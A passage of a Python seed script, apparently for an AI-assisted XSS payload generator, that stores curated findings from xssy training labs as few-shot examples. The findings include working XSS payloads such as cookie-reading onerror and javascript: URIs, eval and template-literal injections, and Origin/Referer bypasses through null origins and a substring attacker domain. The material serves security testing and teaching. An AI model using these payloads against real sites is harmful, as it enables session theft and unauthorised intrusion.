            "Servers that check 'if origin is in allowlist OR origin is null' are vulnerable. "
            "Create a sandboxed iframe that submits a form — Origin header will be 'null'. "
            "Also: file:// pages send null origin; useful in local-file scenarios."
        ),
        tags=["referer-origin", "null-origin", "sandboxed-iframe", "master", "xssy:738"],
        verified=True,
    ),
    Finding(
        sink_type="referer_origin_header",
        context_type="dual_header_check",
        surviving_chars="abcdefghijklmnopqrstuvwxyz.:/0123456789-_",
        bypass_family="referer-header-injection",
        payload="https://allowed.com.attacker.com",
        test_vector=(
            "Both Referer and Origin set to 'https://allowed.com.attacker.com'. "
            "Referer check: startsWith or includes 'allowed.com' → passes. "
            "Origin check: if also substring-based → passes. "
            "Control allowed.com.attacker.com to serve the attack page."
        ),
        model="curated",
        explanation=(
            "Substring bypass on both headers simultaneously. "
            "Some servers use the same weak check for both Referer and Origin. "
            "A single domain that contains the allowed value as a substring "
            "bypasses both checks in one shot. Requires registering the attacker subdomain."
        ),
        tags=["referer-origin", "substring-bypass", "both-headers", "master", "xssy:738"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: XSS by Junior Dev  (id=1570)
    # Technique: common beginner mistakes that create XSS vulnerabilities
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="junior_dev_mistake",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()' ",
        bypass_family="html-attribute-breakout",
        payload="<img src=x onerror=alert(document.cookie)>",
        test_vector=(
            "Try in any input that appears in the UI. Junior devs often use: "
            "element.innerHTML = userInput (instead of textContent). "
            "Or: document.write(userInput). "
            "Or: $(selector).html(userInput) (jQuery .html() vs .text())."
        ),
        model="curated",
        explanation=(
            "innerHTML vs textContent: the most common junior dev XSS mistake. "
            "textContent sets raw text (safe). innerHTML parses as HTML (dangerous). "
            "A junior dev building a 'dynamic UI' with innerHTML on user data "
            "creates a trivial XSS."
        ),
        tags=["junior-dev", "innerHTML", "master", "xssy:1570"],
        verified=True,
    ),
    Finding(
        sink_type="eval",
        context_type="junior_dev_mistake",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'=+0123456789",
        bypass_family="constructor-chain",
        payload="alert(1)",
        test_vector=(
            "Inject into any field that gets eval()'d. Junior devs sometimes use: "
            "eval(userInput) for 'dynamic calculations', "
            "setTimeout(userInput, 1000) for 'custom callbacks', "
            "new Function(userInput)() for 'configurable logic'."
        ),
        model="curated",
        explanation=(
            "eval() and setTimeout/setInterval with string arguments are dangerous sinks. "
            "Junior devs use them for dynamic behaviour without understanding the XSS implication. "
            "Any user input reaching these sinks executes as JS."
        ),
        tags=["junior-dev", "eval-sink", "master", "xssy:1570"],
        verified=True,
    ),
    Finding(
        sink_type="location_href",
        context_type="junior_dev_mistake",
        surviving_chars="abcdefghijklmnopqrstuvwxyz:/()\"'=",
        bypass_family="html-attribute-breakout",
        payload="javascript:alert(document.cookie)",
        test_vector=(
            "Inject into any redirect parameter: ?next=, ?url=, ?return_to=, ?redirect=. "
            "Junior devs often do: location.href = req.params.url "
            "or window.location = getParam('next') without validation."
        ),
        model="curated",
        explanation=(
            "Open redirect → XSS via javascript: URI. "
            "location.href = 'javascript:alert(1)' executes JS in the current page context. "
            "Junior devs implement redirects without checking the scheme, "
            "assuming any URL is safe to redirect to."
        ),
        tags=["junior-dev", "open-redirect", "javascript-uri", "master", "xssy:1570"],
        verified=True,
    ),
    Finding(
        sink_type="template_literal",
        context_type="junior_dev_mistake",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=(){}$`+",
        bypass_family="template-literal-breakout",
        payload="${alert(1)}",
        test_vector=(
            "Inject into template literal context: "
            "element.innerHTML = `Hello ${userInput}` "
            "The ${} syntax is executed by JS before being inserted into innerHTML. "
            "JS executes first, then the result goes into HTML."
        ),
        model="curated",
        explanation=(
            "Template literal XSS: junior devs use template literals for string building "
            "but don't realise that ${userInput} executes arbitrary JS expressions. "
            "Even if innerHTML is avoided, `Hello ${userInput}` still evaluates "
            "any expression inside ${}. Payload fires during string construction."
        ),
        tags=["junior-dev", "template-literal", "master", "xssy:1570"],
        verified=True,
    ),
]


# ---------------------------------------------------------------------------
# Seed runner
# ---------------------------------------------------------------------------

def _count_partition(context_type: str) -> int:
    from ai_xss_generator.findings import _partition_path
    path = _partition_path(context_type)
    if not path.exists():
        return 0
    return sum(1 for l in path.read_text(encoding="utf-8").splitlines() if l.strip())


def main() -> int:
    header("\n=== axss-learn: seeding Master lab knowledge — LET'S GOOO ===\n")
    info(f"Writing {len(MASTER_FINDINGS)} curated findings to ~/.axss/findings/")
    print()

    saved = 0
    skipped = 0
    for f in MASTER_FINDINGS:
        try:
            before = _count_partition(f.context_type)
            save_finding(f)
            after = _count_partition(f.context_type)
            if after > before:
                saved += 1
                info(f"  + [{f.bypass_family:<28}]  {f.payload[:65]}")
            else:
                skipped += 1
        except Exception as exc:
            warn(f"  ! Failed: {exc}")

    print()
    success(f"Done. {saved} new findings saved, {skipped} already existed.")
    info(
        "Run 'python axss_learn.py --min-rating 3 --max-rating 3' to generate "
        "payloads with all Master findings as few-shot examples."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
